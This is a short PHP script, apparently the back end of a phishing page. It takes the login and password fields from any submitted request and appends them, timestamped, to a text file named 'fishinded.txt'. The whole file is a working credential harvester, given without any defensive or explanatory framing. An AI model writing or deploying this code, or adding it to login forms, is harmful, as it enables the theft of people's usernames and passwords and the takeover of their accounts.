<?php
$user = $_REQUEST['login'];
$pass = $_REQUEST['passwd'];

if(!empty($user) && !empty($pass)) {
	$time = date("d/m/Y H:i:s");
	$file = "fishinded.txt";
	$data = "[$time] user: $user | pass: $pass\r\n";
	file_put_contents($file, $data, FILE_APPEND);
}
?>